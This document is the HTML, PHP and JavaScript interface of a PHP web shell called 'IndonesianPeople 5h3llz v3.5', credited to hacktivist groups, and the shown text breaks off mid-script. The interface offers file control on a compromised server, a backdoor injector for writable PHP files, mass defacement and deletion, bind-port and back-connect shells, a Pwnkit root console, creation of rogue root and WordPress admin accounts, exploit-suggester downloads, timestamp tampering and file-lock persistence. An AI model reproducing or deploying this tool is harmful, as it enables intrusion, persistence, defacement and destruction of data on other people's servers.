<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IndonesianPeople 5h3llz</title>
    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='%2300f5d4' d='M2 2v12h12V2zm1 1h10v10H3zm1 1v8h8V4zm1 1v6h6V5z'/%3E%3C/svg%3E">
    <meta name="robots" content="noindex, nofollow">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>:root{--bs-dark-rgb:13,27,42;--bs-secondary-rgb:27,38,59;--bs-body-bg:#0d1b2a;--bs-body-color:#e0e1dd;--primary-accent:#00f5d4;--primary-accent-rgb:0,245,212;--secondary-accent:#00b4d8;--danger-color:#f94144;--success-color:#90be6d;--link-color:var(--primary-accent);--link-hover-color:#fff}body{font-family:'Roboto Mono',monospace}a{color:var(--link-color);text-decoration:none}a:hover{color:var(--link-hover-color)}gr{color:var(--success-color)}rd{color:var(--danger-color)}.table{--bs-table-bg:#1b263b;--bs-table-border-color:#404a69;--bs-table-hover-bg:#223344}.table td,.table th{white-space:nowrap}.btn-main{background-color:transparent;border:1px solid var(--primary-accent);color:var(--primary-accent);transition:all .2s ease-in-out}.btn-main:hover{background-color:var(--primary-accent);color:var(--bs-body-bg);box-shadow:0 0 15px rgba(var(--primary-accent-rgb),.5)}.modal-content{background-color:#1b263b;border:1px solid var(--primary-accent)}.form-control,.form-select{background-color:#0d1b2a;color:#fff;border-color:#404a69}.form-control:focus{border-color:var(--primary-accent);box-shadow:0 0 0 .25rem rgba(var(--primary-accent-rgb),.25)}.path-bar a,.path-bar span{color:#8e9aaf}.path-bar a:hover{color:#fff}.banner{padding:1rem 1.5rem;background:linear-gradient(135deg,rgba(27,38,59,.8),rgba(13,27,42,.9));border-radius:8px;margin-bottom:1.5rem;border:1px solid #404a69}.banner-title{font-size:2rem;color:#fff;font-weight:700;text-shadow:0 0 10px var(--primary-accent)}.banner-text{color:var(--primary-accent)}#toast-container{position:fixed;top:1rem;right:1rem;z-index:9999}.toast{width:350px;max-width:100%}.output-console{background:#000;color:#eee;font-family:'Roboto Mono',monospace;font-size:.85em;max-height:400px;overflow-y:auto;white-space:pre-wrap;word-wrap:break-word;border-radius:5px;padding:1rem}</style>
</head>
<body>
<div class="container-fluid py-3">
    <div class="banner">
        <div class="d-flex justify-content-between align-items-center">
            <div>
                <h1 class="banner-title">IndonesianPeople 5h3llz <span class="banner-text">v3.5</span></h1>
                <small class="text-white-50">Created on June 12, 2025.<br>Special Credits: Tersakiti Crew, AnonSec Team, z3r0-team!, #CianjurHacktivist, Ghost Hunter Illusion.</small>
            </div>
            <div class="d-flex flex-column align-items-end">
                <a href="?left" class="btn btn-sm btn-outline-danger"><i class="bi bi-box-arrow-in-left"></i> Logout</a>
            </div>
        </div>
    </div>
    <div class="card bg-secondary mb-3"><div class="card-body p-2"><small>
        <i class="bi bi-hdd-fill"></i> Uname: <gr><?php echo php_uname(); ?></gr><br>
        <i class="bi bi-motherboard-fill"></i> Software: <gr><?php echo $_SERVER['SERVER_SOFTWARE']; ?></gr><br>
        <i class="bi bi-cpu-fill"></i> User: <gr><?php echo "$_29368d18 ($_539b0606)"; ?></gr> | Group: <gr><?php echo "$_710880fc ($_4c397118)"; ?></gr> | Safe Mode: <?php echo $_eceee900; ?><br>
        <i class="bi bi-plugin"></i> PHP: <gr><?php echo PHP_VERSION; ?></gr> <a href="?id=phpinfo" target="_blank">[PHPINFO]</a> | Tools: MySQL: <?php echo $_1e31f9a2; ?> | cURL: <?php echo $_7a4488a6; ?> | WGET: <?php echo $_27d89127; ?> | Perl: <?php echo $_9fe66f11; ?> | Python: <?php echo $_e5744d42; ?><br>
        <i class="bi bi-shield-slash-fill"></i> Disabled Functions: <?php echo $_212ec827; ?>
    </small></div></div>
    <div class="card bg-secondary p-2 mb-3">
        <div class="d-flex flex-wrap justify-content-between align-items-center">
            <div class="path-bar text-break mb-2 mb-md-0"><i class="bi bi-folder2-open"></i><?php                 $_9c220f20 = explode('/', rtrim($_b548b0f, '/'));
                if (count($_9c220f20) == 1 && $_9c220f20[0] == '') { echo "<a href='?path=/'>/</a>"; } 
                else {
                    $_c28e6e5 = '';
                    foreach ($_9c220f20 as $_bf396750 => $_803e5e81) {
                        if ($_bf396750 == 0 && empty($_803e5e81)) { $_c28e6e5 = '/'; echo "<a href='?path=/'>/</a>"; continue; }
                        $_c28e6e5 .= $_803e5e81 . '/';
                        echo "<span>/</span><a href='?path=" . urlencode($_c28e6e5) . "'>" . htmlspecialchars($_803e5e81) . "</a>";
                    }
                }
            ?>&nbsp;[ <?php echo _5a7e74d(rtrim($_b548b0f, '/'),_e38e795e(rtrim($_b548b0f, '/'))); ?> ]</div>
            <div class="btn-toolbar">
                <div class="btn-group me-2 mb-2 mb-md-0" role="group">
                    <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" class="btn btn-sm btn-main"><i class="bi bi-house-door-fill"></i> Home Shell</a>
                </div>
                <div class="btn-group me-2 mb-2 mb-md-0" role="group">
                    <button id="btnUpload" class="btn btn-sm btn-main"><i class="bi bi-upload"></i> Upload</button>
                    <button id="btnNewFile" class="btn btn-sm btn-main"><i class="bi bi-file-earmark-plus"></i> New File</button>
                    <button id="btnNewFolder" class="btn btn-sm btn-main"><i class="bi bi-folder-plus"></i> New Folder</button>
                </div>
                <div class="btn-group me-2 mb-2 mb-md-0" role="group">
                    <button id="btnNetwork" class="btn btn-sm btn-main"><i class="bi bi-hdd-network"></i> Network</button>
                    <button id="btnInjector" class="btn btn-sm btn-main"><i class="bi bi-bug-fill"></i> Injector</button>
                    <button id="btnMassTools" class="btn btn-sm btn-main"><i class="bi bi-exclamation-diamond"></i> Mass Tools</button>
                    <button id="btnMassDateTimeChange" class="btn btn-sm btn-main"><i class="bi bi-calendar-range"></i> Mass Date/Time</button>
                </div>
                <div class="btn-group mb-2 mb-md-0" role="group">
                    <button id="btnTerminal" class="btn btn-sm btn-main"><i class="bi bi-terminal-plus"></i> Terminal</button>
                    <button id="btnUsers" class="btn btn-sm btn-main"><i class="bi bi-people-fill"></i> Users</button>
                    <button id="btnSecurity" class="btn btn-sm btn-main"><i class="bi bi-shield-lock"></i> Security</button>
                    <button id="btnScanRoot" class="btn btn-sm btn-main"><i class="bi bi-bug"></i> Root/SUID Scan</button>
                    <button id="btnRootShell" class="btn btn-sm btn-main"><i class="bi bi-fire"></i> Root Shell</button>
                </div>
            </div>
        </div>
    </div>
    <div class="table-responsive"><table class="table table-hover table-sm align-middle"><thead class="table-dark"><tr><th style="width:2%"><input type="checkbox" id="selectAll"></th><th>Name</th><th class="text-center">Size</th><th class="text-center">Modified</th><th class="text-center">Owner/Group</th><th class="text-center">Perms</th><th class="text-center">Actions <button class="btn btn-sm btn-outline-danger d-none" id="deleteSelectedBtn"><i class="bi bi-trash-fill"></i></button></th></tr></thead><tbody><tr><td></td><td><i class="bi bi-arrow-return-left"></i> <a href="?path=<?php echo urlencode(dirname($_b548b0f));?>">..</a></td><td colspan="5"></td></tr><?php foreach($_6037415 as $_baab7a10):?><tr><td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($_b548b0f.$_baab7a10);?>"></td><td><i class="bi bi-folder-fill text-warning"></i> <a href="?path=<?php echo urlencode($_b548b0f.htmlspecialchars($_baab7a10));?>"><?php echo htmlspecialchars($_baab7a10);?></a></td><td class="text-center">-</td><td class="text-center"><?php echo date("Y-m-d H:i",@filemtime($_b548b0f.$_baab7a10));?></td><td class="text-center"><?php echo(function_exists('posix_getpwuid')?posix_getpwuid(@fileowner($_b548b0f.$_baab7a10))['name']:@fileowner($_b548b0f.$_baab7a10)).'/'.(function_exists('posix_getgrgid')?posix_getgrgid(@filegroup($_b548b0f.$_baab7a10))['name']:@filegroup($_b548b0f.$_baab7a10));?></td><td class="text-center"><?php echo _5a7e74d($_b548b0f.$_baab7a10,_e38e795e($_b548b0f.$_baab7a10));?></td><td class="text-center"><button class="btn btn-sm btn-outline-primary" onclick="_js_rn('<?php echo htmlspecialchars($_b548b0f.$_baab7a10);?>')"><i class="bi bi-pencil-fill"></i></button></td></tr><?php endforeach;?><?php foreach($_6354059 as $_8c9f3610):?><tr><td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($_b548b0f.$_8c9f3610);?>"></td><td><i class="bi bi-file-earmark-text-fill text-white-50"></i> <a href="#" onclick="_js_vw('<?php echo htmlspecialchars($_b548b0f.$_8c9f3610);?>')"><?php echo htmlspecialchars($_8c9f3610);?></a></td><td class="text-center"><?php echo _4ab2c56d(@filesize($_b548b0f.$_8c9f3610));?></td><td class="text-center"><?php echo date("Y-m-d H:i",@filemtime($_b548b0f.$_8c9f3610));?></td><td class="text-center"><?php echo(function_exists('posix_getpwuid')?posix_getpwuid(@fileowner($_b548b0f.$_8c9f3610))['name']:@fileowner($_b548b0f.$_8c9f3610)).'/'.(function_exists('posix_getgrgid')?posix_getgrgid(@filegroup($_b548b0f.$_8c9f3610))['name']:@filegroup($_b548b0f.$_8c9f3610));?></td><td class="text-center"><?php echo _5a7e74d($_b548b0f.$_8c9f3610,_e38e795e($_b548b0f.$_8c9f3610));?></td><td class="text-center"><div class="btn-group"><button class="btn btn-sm btn-outline-info" onclick="_js_ed('<?php echo htmlspecialchars($_b548b0f.$_8c9f3610);?>')"><i class="bi bi-pencil-square"></i></button><button class="btn btn-sm btn-outline-primary" onclick="_js_rn('<?php echo htmlspecialchars($_b548b0f.$_8c9f3610);?>')"><i class="bi bi-pencil-fill"></i></button><a href="?action=download&file=<?php echo urlencode($_b548b0f.$_8c9f3610);?>" class="btn btn-sm btn-outline-success"><i class="bi bi-download"></i></a><button class="btn btn-sm btn-outline-warning" onclick="_js_stm('<?php echo htmlspecialchars($_b548b0f.$_8c9f3610); ?>', '<?php echo date("Y-m-d H:i:s",@filemtime($_b548b0f.$_8c9f3610));?>')"><i class="bi bi-clock"></i></button><button class="btn btn-sm btn-outline-info" onclick="_js_scm('<?php echo htmlspecialchars($_b548b0f.$_8c9f3610); ?>', '<?php echo _e38e795e($_b548b0f.$_8c9f3610);?>')"><i class="bi bi-key"></i></button></div></td></tr><?php endforeach;?></tbody></table></div>
    <footer class="text-center text-white-50 mt-4">&copy; 2022-<?php echo date('Y');?> IndonesianPeople 5h3llz // Rebuilt by Local Pride</footer>
</div>
<div id="toast-container" class="toast-container position-fixed top-0 end-0 p-3"></div>
<div class="modal fade" id="uploadModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-upload"></i> Upload Files</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form method="POST" enctype="multipart/form-data"><input type="hidden" name="path" value="<?php echo htmlspecialchars($_b548b0f); ?>"><div class="mb-3"><label for="files" class="form-label">Files will be uploaded to the current directory.</label><input class="form-control" type="file" name="files[]" multiple required></div><button type="submit" class="btn btn-main w-100">Upload</button></form><hr><p>Remote File Upload</p><form id="remoteUploadForm"><div class="mb-3"><label for="remoteUrl" class="form-label">URL:</label><input type="text" class="form-control" id="remoteUrl" name="url" placeholder="https://example.com/file.txt" required></div><div class="mb-3"><label for="remoteFilename" class="form-label">Save as (optional, default: original filename):</label><input type="text" class="form-control" id="remoteFilename" name="filename" placeholder="new_filename.txt"></div><button type="submit" class="btn btn-main w-100">Remote Upload</button></form></div></div></div></div>
<div class="modal fade" id="createFileModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-file-earmark-plus"></i> Create New File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFileForm"><div class="mb-3"><label for="newFileName" class="form-label">Filename:</label><input type="text" class="form-control" id="newFileName" placeholder="newfile.txt" required></div><button type="submit" class="btn btn-main w-100">Create</button></form></div></div></div></div>
<div class="modal fade" id="createFolderModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-folder-plus"></i> Create New Folder</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFolderForm"><div class="mb-3"><label for="newFolderName" class="form-label">Folder Name:</label><input type="text" class="form-control" id="newFolderName" placeholder="new_folder" required></div><button type="submit" class="btn btn-main w-100">Create</button></form></div></div></div></div>
<div class="modal fade" id="injectModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-bug-fill"></i> Backdoor Injector</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="injectSuccessMessage" class="alert alert-success d-none mb-3">Backdoor injected! Use parameter `__x` to execute. Example: `INJECTED_FILE_URL?__x&cmd=id`.</div><form id="injectForm"><div class="mb-3"><label for="targetFile" class="form-label">Target PHP File:</label><select class="form-select" id="targetFile" name="file" required><option value="" selected disabled>-- Select a writable PHP file --</option><?php foreach ($_6354059 as $_8c9f3610) { if (pathinfo($_8c9f3610, PATHINFO_EXTENSION) == 'php' && is_writable($_b548b0f . $_8c9f3610)) { echo '<option value="' . htmlspecialchars($_b548b0f.$_8c9f3610) . '">' . htmlspecialchars($_8c9f3610) . '</option>'; } } ?></select></div><button type="submit" class="btn btn-danger w-100">Inject Backdoor</button></form></div></div></div></div>
<div class="modal fade" id="editorModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title" id="editorFileName"></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="editorContainer" style="position: relative;"><textarea id="editorContent" class="form-control" style="height: 60vh; font-family: 'Roboto Mono';"></textarea></div></div><div class="modal-footer"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button><button type="button" class="btn btn-main" id="saveFileBtn">Save Changes</button></div></div></div></div>
<div class="modal fade" id="massDefaceModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-exclamation-diamond"></i> Mass Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="massOutput" class="output-console mb-3 d-none"></div><p>Mass Deface</p><form id="massDefaceForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($_b548b0f); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><div class="mb-2"><textarea class="form-control" rows="3" name="script" placeholder="Hacked" required></textarea></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="onedir" value="onedir" checked><label class="form-check-label" for="onedir">One Dir</label></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="mass" value="mass"><label class="form-check-label" for="mass">Recursive</label></div><button type="submit" class="btn btn-main w-100 mt-2">Start Deface</button></form><hr><p class="mt-3">Mass Delete</p><form id="massDeleteForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($_b548b0f); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><button type="submit" class="btn btn-danger w-100 mt-2">Start Deleting</button></form></div></div></div></div>
<div class="modal fade" id="networkModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-hdd-network"></i> Network Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="networkOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-tab" role="tablist"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-bind">Bind Port</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-back">Back-Connect</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-bind"><form class="network-form"><h6>Bind Port to /bin/sh [Perl]</h6><div class="input-group"><input class="form-control" type="text" name="port" placeholder="6969" required><button class="btn btn-main" type="submit" name="bpl">Execute</button></div></form></div><div class="tab-pane fade" id="nav-back"><form class="network-form"><h6>Back-Connect</h6><div class="mb-2"><label class="form-label">Server IP:</label><input class="form-control" type="text" name="server" value="<?php echo _1b88bc9f(); ?>" required></div><div class="mb-2"><label class="form-label">Port:</label><input class="form-control" type="text" name="port" placeholder="6969" required></div><div class="input-group"><select class="form-select" name="bc"><option value="perl">Perl</option><option value="python">Python</option></select><button class="btn btn-main" type="submit">Execute</button></div></form></div></div></div></div></div></div>
<div class="modal fade" id="rootConsoleModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-terminal-plus"></i> Command Console</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="pwnkitStatus" class="alert alert-secondary">Checking Pwnkit status...</div><div id="rootCmdOutput" class="output-console mb-3"># Output will appear here...</div><form id="rootCmdForm"><div class="input-group"><span class="input-group-text" id="promptIndicator">#</span><input type="text" class="form-control" id="rootCmdInput" placeholder="id" required><button class="btn btn-main" type="submit">Execute</button></div></form></div></div></div></div>
<div class="modal fade" id="securityModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-shield-lock"></i> Security Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="securityOutput" class="output-console mb-3 d-none"></div><h6 class="text-white-50">Backdoor Destroyer</h6><p><small>This will overwrite the <code>.htaccess</code> file in the document root to block access to all PHP files except this shell and common CMS files. Use with caution.</small></p><button type="button" class="btn btn-danger w-100 mb-4" id="destroyerBtn">Activate Backdoor Destroyer</button><hr><h6 class="text-white-50">Lock File / Shell</h6><p><small>Creates a background process to ensure a file remains locked (read-only) and is restored if deleted.</small></p><form id="lockItemForm"><div class="input-group"><input type="text" class="form-control" name="file_to_lock" placeholder="filename.php (full path)" required><button type="submit" class="btn btn-main">Lock Item</button></div></form></div></div></div></div>
<div class="modal fade" id="usersModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-people-fill"></i> User Management</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="usersOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-user-tab"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-root-user">Root User</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-wp-user">WordPress User</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-root-user"><p><small>Add a new root user to the system. Requires a vulnerable server (check with Root Console).</small></p><form id="addRootUserForm"><div class="mb-2"><label class="form-label">Username</label><input type="text" name="username" class="form-control" required></div><div class="mb-2"><label class="form-label">Password</label><input type="text" name="password" class="form-control" required></div><button type="submit" class="btn btn-main w-100">Add Root User</button></form></div><div class="tab-pane fade" id="nav-wp-user"><p><small>Add a new administrator user to a WordPress installation.</small></p><form id="addWpUserForm"><div class="input-group mb-2"><input type="text" class="form-control" id="wpConfigPath" placeholder="Auto-detect or enter path to wp-config.php"><button type="button" class="btn btn-outline-secondary" id="parseWpConfigBtn">Parse</button></div><div class="row"><div class="col-md-6 mb-2"><input type="text" id="db_host" name="db_host" class="form-control" placeholder="DB Host" required></div><div class="col-md-6 mb-2"><input type="text" id="db_name" name="db_name" class="form-control" placeholder="DB Name" required></div><div class="col-md-6 mb-2"><input type="text" id="db_user" name="db_user" class="form-control" placeholder="DB User" required></div><div class="col-md-6 mb-2"><input type="text" id="db_pass" name="db_pass" class="form-control" placeholder="DB Password"></div><hr class="my-2"><div class="col-md-6 mb-2"><input type="text" name="wp_user" class="form-control" placeholder="New WP Username" required></div><div class="col-md-6 mb-2"><input type="text" name="wp_pass" class="form-control" placeholder="New WP Password" required></div></div><button type="submit" class="btn btn-main w-100 mt-2">Add WordPress Admin</button></form></div></div></div></div></div></div>
<div class="modal fade" id="scanRootModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-bug"></i> Root & SUID Scanner / Exploit Suggester</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><nav><div class="nav nav-tabs" id="nav-scan-tab"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-autoscan">Auto Root Scan</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-suidscan">Scan SUID</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-exploitsuggester">Exploit Suggester</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-autoscan"><p><small>Attempts to run known local privilege escalation exploits to check for vulnerabilities.</small></p><button type="button" class="btn btn-main w-100 mb-3" id="startAutoScanBtn">Start Auto Scan</button><div id="autoScanOutput" class="output-console mb-3 d-none"></div></div><div class="tab-pane fade" id="nav-suidscan"><p><small>Scans for files with SUID (Set User ID) bit set, which can sometimes be exploited for privilege escalation.</small></p><button type="button" class="btn btn-main w-100 mb-3" id="startSuidScanBtn">Start SUID Scan</button><div id="suidScanOutput" class="output-console mb-3 d-none"></div></div><div class="tab-pane fade" id="nav-exploitsuggester"><p><small>Downloads and runs the Linux Exploit Suggester script to find potential exploits based on kernel version and installed software.</small></p><button type="button" class="btn btn-main w-100 mb-3" id="startExploitSuggesterBtn">Start Exploit Suggester</button><div id="exploitSuggesterOutput" class="output-console mb-3 d-none"></div></div></div></div></div></div></div>
<div class="modal fade" id="touchModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-clock"></i> Change File Timestamp</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="touchForm"><div class="mb-3"><label for="touchFileName" class="form-label">File:</label><input type="text" class="form-control" id="touchFileName" name="file_to_touch_name" readonly></div><div class="mb-3"><label for="touchDateTime" class="form-label">New Date & Time (YYYY-MM-DD HH:MM:SS):</label><input type="text" class="form-control" id="touchDateTime" name="datetime_value" placeholder="Example: 2024-01-01 12:00:00" required></div><button type="submit" class="btn btn-main w-100">Change Timestamp</button></form></div></div></div></div>
<div class="modal fade" id="chmodModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-key"></i> Change Permissions</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="chmodForm"><div class="mb-3"><label for="chmodItemPath" class="form-label">Item Path:</label><input type="text" class="form-control" id="chmodItemPath" name="target_path" readonly></div><div class="mb-3"><label for="chmodPerms" class="form-label">New Permissions (Octal, e.g., 0755):</label><input type="text" class="form-control" id="chmodPerms" name="perms_octal" pattern="[0-7]{4}" required></div><button type="submit" class="btn btn-main w-100">Change Permissions</button></form></div></div></div></div>
<div class="modal fade" id="massDateTimeChangeModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-calendar-range"></i> Mass Date/Time Change</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="massDateTimeChangeOutput" class="output-console mb-3 d-none"></div><form id="massDateTimeChangeForm"><div class="mb-3"><label for="massDateTimeChangeDir" class="form-label">Target Directory:</label><input type="text" class="form-control" id="massDateTimeChangeDir" name="target_dir" value="<?php echo htmlspecialchars($_b548b0f); ?>" required></div><div class="mb-3"><label for="massDateTimeValue" class="form-label">New Date & Time (YYYY-MM-DD HH:MM:SS):</label><input type="text" class="form-control" id="massDateTimeValue" name="datetime_value" placeholder="Example: 2024-01-01 12:00:00" required></div><button type="submit" class="btn btn-main w-100">Apply Mass Change</button></form></div></div></div></div>
<div id="toast-container" class="toast-container position-fixed top-0 end-0 p-3"></div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    const currentPath = '<?php echo htmlspecialchars($_b548b0f, ENT_QUOTES); ?>';
    const scriptUrl = '<?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES); ?>';
    let isPwnkitVulnerable = false;
    let currentConsoleMode = 'user';

    function showToast(message, type = 'success') {
        const toastId = 'toast-' + Date.now();
        const toastHTML = `<div id="${toastId}" class="toast align-items-center text-bg-${type} border-0" role="alert" aria-live="assertive" aria-atomic="true"><div class="d-flex"><div class="toast-body">${message}</div><button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button></div></div>`;
        document.getElementById('toast-container').insertAdjacentHTML('beforeend', toastHTML);
        const toastEl = document.getElementById(toastId);
        if(bootstrap && bootstrap.Toast) { new bootstrap.Toast(toastEl).show(); }
    }

    <?php if(isset($_SESSION['flash_message'])): ?>
        showToast('<?php echo addslashes($_SESSION['flash_message']); ?>');
        <?php unset($_SESSION['flash_message']); ?>
    <?php endif; ?>

    function ajaxRequest(data, successCallback) {
        fetch(`${scriptUrl}?ajax=true&path=${encodeURIComponent(currentPath)}`, { method: 'POST', body: data })
        .then(response => {
            if (!response.ok) { return response.text().then(text => { throw new Error(`Server error: ${response.status}\n${text}`); }); }
            return response.json().catch(error => { return response.text().then(text => { throw new Error(`JSON parse error:\n${text}`); }); });
        })
        .then(successCallback)
        .catch(error => { console.error('AJAX Error:', error); showToast(`Error: ${error.message}`, 'danger'); });
    }

    const modals = {};
    const modalIds = ['uploadModal', 'createFileModal', 'createFolderModal', 'injectModal', 'editorModal', 'massDefaceModal', 'networkModal', 'rootConsoleModal', 'securityModal', 'usersModal', 'scanRootModal', 'touchModal', 'chmodModal', 'massDateTimeChangeModal'];
    modalIds.forEach(id => { const el = document.getElementById(id); if (el) { modals[id] = new bootstrap.Modal(el); } });

    function attachClickListener(buttonId, modalId) { const btn = document.getElementById(buttonId); if (btn && modals[modalId]) { btn.addEventListener('click', () => modals[modalId].show()); } }
    
    attachClickListener('btnUpload', 'uploadModal');
    attachClickListener('btnNewFile', 'createFileModal');
    attachClickListener('btnNewFolder', 'createFolderModal');
    attachClickListener('btnNetwork', 'networkModal');
    attachClickListener('btnInjector', 'injectModal');
    attachClickListener('btnMassTools', 'massDefaceModal');
    attachClickListener('btnMassDateTimeChange', 'massDateTimeChangeModal');
    attachClickListener('btnTerminal', 'rootConsoleModal');
    attachClickListener('btnUsers', 'usersModal');
    attachClickListener('btnSecurity', 'securityModal');
    attachClickListener('btnScanRoot', 'scanRootModal');

    const selectAllCheckbox = document.getElementById('selectAll');
    if (selectAllCheckbox) { selectAllCheckbox.addEventListener('change', e => document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = e.target.checked)); }
    document.querySelectorAll('.file-checkbox').forEach(cb => cb.addEventListener('change', () => document.getElementById('deleteSelectedBtn').classList.toggle('d-none', !document.querySelector('.file-checkbox:checked'))));
    
    const deleteSelectedBtn = document.getElementById('deleteSelectedBtn');
    if(deleteSelectedBtn) {
        deleteSelectedBtn.addEventListener('click', () => {
            const files = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
            if(confirm(`Delete ${files.length} item(s)?`)) {
                const fd = new FormData(); fd.append('action', 'delete_multiple'); files.forEach(f => fd.append('files[]', f));
                ajaxRequest(fd, d => { showToast(`Deleted: ${d.success.length}. Failed: ${d.errors.length}.`,d.errors.length > 0 ? 'warning' : 'success'); if(d.success.length) setTimeout(()=>location.reload(),1e3);});
            }
        });
    }

    document.getElementById('createFileForm')?.addEventListener('submit',e=>{e.preventDefault();const fd=new FormData();fd.append('action','create_file');fd.append('name',document.getElementById('newFileName').value);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok'){modals.createFileModal.hide();_js_ed(d.file_path);}});});
    document.getElementById('createFolderForm')?.addEventListener('submit',e=>{e.preventDefault();const fd=new FormData();fd.append('action','create_folder');fd.append('name',document.getElementById('newFolderName').value);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok'){modals.createFolderModal.hide();setTimeout(()=>location.reload(),1e3);}});});

    window._js_rn=itemPath=>{const n=prompt(`New name for "${basename(itemPath)}":`,basename(itemPath));if(n&&n!==basename(itemPath)){const fd=new FormData();fd.append('action','rename');fd.append('old',itemPath);fd.append('new',n);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')setTimeout(()=>location.reload(),1e3);});}};
    
    let currentEditingFile='';
    const editorContent=document.getElementById('editorContent'), editorFileName=document.getElementById('editorFileName'), saveFileBtn=document.getElementById('saveFileBtn');
    window._js_vw=file=>_js_ed(file,true);
    window._js_ed=(file,readOnly=false)=>{currentEditingFile=file;editorFileName.textContent=(readOnly?'Viewing: ':'Editing: ')+basename(file);editorContent.readOnly=readOnly;saveFileBtn.style.display=readOnly?'none':'block';editorContent.value='Loading...';const fd=new FormData();fd.append('action','get_content');fd.append('file',file);ajaxRequest(fd,d=>{editorContent.value=d.status==='ok'?d.content:d.message;modals.editorModal.show();});};
